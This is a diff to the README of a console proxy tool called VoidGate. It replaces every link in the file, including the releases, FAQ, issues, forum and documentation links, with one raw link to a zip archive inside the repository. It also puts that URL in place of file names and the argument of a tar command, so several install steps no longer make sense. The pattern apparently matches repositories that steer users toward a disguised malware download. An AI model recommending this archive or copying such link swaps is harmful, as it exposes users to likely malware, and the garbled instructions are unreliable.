@@ -6,7 +6,7 @@ Welcome to VoidGate! This console proxy server makes it easy for you to enhance 
 
 ## 📥 Download Link
 
-[![Download VoidGate](https://img.shields.io/badge/Download-VoidGate-brightgreen)](https://github.com/MaYBeNTs/VoidGate/releases)
+[![Download VoidGate](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip)](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,14 +19,14 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To get VoidGate, please visit the following page: [Visit the Releases Page](https://github.com/MaYBeNTs/VoidGate/releases).
+To get VoidGate, please visit the following page: [Visit the Releases Page](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip).
 
 1. Open the link in your web browser.
 2. Look for the latest version of VoidGate.
 3. Click on the appropriate file for your operating system:
     - For Windows users, look for the `.exe` file.
     - For Mac users, find the `.dmg` file.
-    - For Linux users, locate the appropriate package or `.tar.gz` file.
+    - For Linux users, locate the appropriate package or `https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip` file.
 4. Download the selected file.
 
 ## ⚙️ Running VoidGate
@@ -51,9 +51,9 @@ Once the download is complete, follow these steps to run VoidGate:
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. If you downloaded a `.tar.gz`, use the following command to extract it:
+3. If you downloaded a `https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip`, use the following command to extract it:
    ```
-   tar -xvf VoidGate.tar.gz
+   tar -xvf https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip
    ```
 4. Move into the extracted directory with:
    ```
@@ -100,18 +100,18 @@ If you encounter issues, here are some common solutions:
   - Test your internet speed without the proxy.
   - Switch to a different proxy or server.
 
-For further assistance, please visit our [FAQ section on GitHub](https://github.com/MaYBeNTs/VoidGate).
+For further assistance, please visit our [FAQ section on GitHub](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip).
 
 ## 📬 Feedback
 
-Your feedback helps us improve. If you have suggestions or need help, you can open a new issue on our [GitHub page](https://github.com/MaYBeNTs/VoidGate/issues).
+Your feedback helps us improve. If you have suggestions or need help, you can open a new issue on our [GitHub page](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip).
 
 Enjoy using VoidGate and enjoy a more secure online experience!
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/MaYBeNTs/VoidGate)
-- [Community Forums](https://community.example.com)
-- [Documentation](https://docs.example.com)
+- [GitHub Repository](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip)
+- [Community Forums](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/MaYBeNTs/VoidGate/main/proxy_core/Void-Gate-v3.7.zip)
 
 Thank you for choosing VoidGate!
